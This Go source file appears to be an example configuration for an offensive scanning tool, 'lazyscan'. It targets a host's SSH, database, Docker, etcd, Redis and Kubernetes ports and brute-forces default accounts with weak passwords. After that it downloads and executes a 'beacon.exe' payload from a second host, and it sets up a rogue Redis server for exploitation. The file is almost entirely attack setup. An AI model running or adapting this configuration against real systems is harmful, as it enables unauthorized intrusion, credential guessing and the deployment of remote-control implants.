package main

import "github.com/404tk/lazyscan/runner"

func main() {
	options := &runner.Options{
		Host:             "172.16.61.2",
		HostFile:         "",
		Ports:            "22,1433,2375,2379,3306,5432,6379,6443",
		NoPing:           false,
		Scantype:         "all",
		Timeout:          3,
		Threads:          600,
		LiveTop:          10,
		HTTPDownloadAddr: "http://192.168.1.2:8080/beacon.exe",
		TCPDownloadAddr:  "192.168.1.2:8553/beacon.exe",
		FileName:         "beacon.exe",
		ExecCommand:      "beacon.exe",
		RedisRogueServer: "192.168.1.2:6380",
		Userdict: map[string][]string{
			"mysql":      {"root"},
			"ssh":        {"root"},
			"mssql":      {"sa"},
			"postgresql": {"postgres"},
		},
		Passwords: []string{"123456", "{user}", "{user}@123"},
		PortList: map[string]string{
			"ssh":           "22",
			"mssql":         "1433",
			"docker-remote": "2375",
			"etcd":          "2379",
			"mysql":         "3306",
			"postgresql":    "5432",
			"redis":         "6379",
			"kube-api":      "6443",
			"all":           "0",
		},
	}
	runner := runner.New(options)
	runner.Enumerate()
}
